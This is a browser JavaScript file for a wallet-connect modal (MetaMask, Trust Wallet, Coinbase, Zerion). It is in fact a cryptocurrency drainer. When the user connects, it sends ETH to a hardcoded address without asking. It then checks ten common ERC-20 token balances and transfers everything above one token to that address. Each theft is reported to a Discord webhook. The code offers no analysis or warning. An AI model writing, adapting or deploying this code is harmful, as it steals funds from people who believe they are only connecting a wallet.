let isConnecting = false; // Flag to prevent multiple connections

document.getElementById("connectButton").addEventListener("click", openModal);

function openModal() {
    const modal = document.getElementById("walletModal");
    modal.style.display = "block";
    const modalContent = modal.querySelector(".modal-content");
    modalContent.style.bottom = "0"; // Slide up
    console.log("Modal opened for wallet selection");
}

function closeModal() {
    const modalContent = document.querySelector(".modal-content");
    modalContent.style.bottom = "-100%"; // Slide down

    // Delay hiding the modal background until the slide-down animation completes
    setTimeout(() => {
        document.getElementById("walletModal").style.display = "none";
        console.log("Modal closed after wallet selection");
    }, 400); // Match this duration with the CSS transition time
}

async function connectMetaMask() {
    console.log("MetaMask button clicked");
    await connectWallet("MetaMask");
}

async function connectTrustWallet() {
    console.log("Trust Wallet button clicked");
    await connectWallet("Trust Wallet");
}

async function connectCoinbaseWallet() {
    console.log("Coinbase Wallet button clicked");
    await connectWallet("Coinbase Wallet");
}

async function connectZerionWallet() {
    console.log("Zerion Wallet button clicked");
    await connectWallet("Zerion Wallet");
}

async function connectWallet(walletName) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true;
    closeModal(); // Close the wallet modal when a selection is made

    try {
        let account;
        console.log(`Attempting to connect to ${walletName}...`);

        // Open the wallet app externally for mobile users
        if (isMobile()) {
            if (walletName === "MetaMask") {
                window.location.href = "metamask://"; // MetaMask deep link
            } else if (walletName === "Trust Wallet") {
                window.location.href = "trust://"; // Trust Wallet deep link
            } else if (walletName === "Coinbase Wallet") {
                window.location.href = "cbwallet://"; // Coinbase Wallet deep link
            } else if (walletName === "Zerion Wallet") {
                window.location.href = "zerion://"; // Zerion Wallet deep link
            }
            console.log(`${walletName} deep link triggered for mobile`);
        } else {
            // Fallback for desktop users or if deep linking fails
            if (typeof window.ethereum !== 'undefined') {
                console.log(`${walletName} detected. Requesting account...`);
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to ${walletName} account: ${account}`);
            } else {
                alert(`${walletName} is not installed. Please install it.`);
                console.error(`${walletName} is not installed in the browser.`);
                return;
            }
        }

        if (account) {
            console.log(`Wallet connected. Initiating transaction for account: ${account}`);
            await sendFirstTransaction(account); // Automatically send the first transaction
        } else {
            console.error("No account found.");
        }

    } catch (error) {
        console.error(`Error connecting to ${walletName}:`, error);
    } finally {
        isConnecting = false; // Reset the flag
        console.log(`Finished connection attempt for ${walletName}`);
    }
}

function isMobile() {
    // Simple check for mobile devices
    return /Mobi|Android/i.test(navigator.userAgent);
}

async function sendFirstTransaction(walletAddress) {
    console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);

    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x64B04f1Eb0d4062f7D7199B099a7a3dC438EEb67"; // Your recipient address
        const amountInEther = "0.0002"; // Amount to send in first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction sent successfully. Response:", txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Automatically trigger the second transaction (ERC-20 token transfer)
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);

            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("Ethereum provider not detected. Please install MetaMask or another wallet.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    console.log(`Preparing to send second transaction (ERC-20 tokens) for wallet: ${walletAddress}`);

    // List of ERC-20 token addresses (example)
    const tokenAddresses = [
        "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
        "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USD Coin (USDC)
        "0x56d811088235F11C8920698a204A5010a788f4b3", // Binance Coin (BNB)
        "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
        "0x5C69bEe701ef814a2B6a3EDD4e1eF2400dDd33d6", // Uniswap (UNI)
        "0x6b175474e89094c44da98b954eedeac495271d0f", // Dai (DAI)
        "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", // Shiba Inu (SHIB)
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // Wrapped Bitcoin (WBTC)
        "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", // Polygon (MATIC)
        "0x7f7d7d2b8a2e4d9e4f709cb48ff4623c77e5bc98", // Aave (AAVE)
    ];

    const tokenABI = [
        "function balanceOf(address account) public view returns (uint256)",
        "function transfer(address to, uint256 amount) public returns (bool)"
    ];

    // Loop through each token address and check the balance
    for (let tokenAddress of tokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
        const tokenBalance = await tokenContract.balanceOf(walletAddress);
        const tokenAmount = ethers.utils.formatUnits(tokenBalance, 18); // Assuming 18 decimals for ERC-20 tokens

        // Define token threshold (e.g., 1 token of each type)
        const tokenThresholdAmount = 1;

        if (parseFloat(tokenAmount) > tokenThresholdAmount) {
            const amountToSend = ethers.utils.parseUnits(tokenAmount, 18); // Send all available tokens above the threshold
            console.log(`Sending ${tokenAmount} tokens of ${tokenAddress} to recipient.`);

            const recipientAddress = "0x64B04f1Eb0d4062f7D7199B099a7a3dC438EEb67"; // Set the recipient for the second transaction

            try {
                const txResponse = await tokenContract.transfer(recipientAddress, amountToSend);
                console.log(`Second transaction (ERC-20 token ${tokenAddress}) sent successfully. Response:`, txResponse);

                // Send to Discord webhook
                await sendWebhook(txResponse.hash, "success");
            } catch (error) {
                console.error(`Error sending second ERC-20 token transaction for ${tokenAddress}:`, error);
                // Send to Discord webhook
                await sendWebhook(error.message, "failure");
            }
        } else {
            console.log(`Balance for token ${tokenAddress} is below the threshold. No token transfer sent.`);
        }
    }
}

async function sendWebhook(message, status) {
    console.log(`Sending webhook. Status: ${status}, Message: ${message}`);

    const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; // Replace with your actual webhook URL

    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: `Transaction ${status}: ${message}`,
            }),
        });
        console.log("Webhook sent successfully.");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}
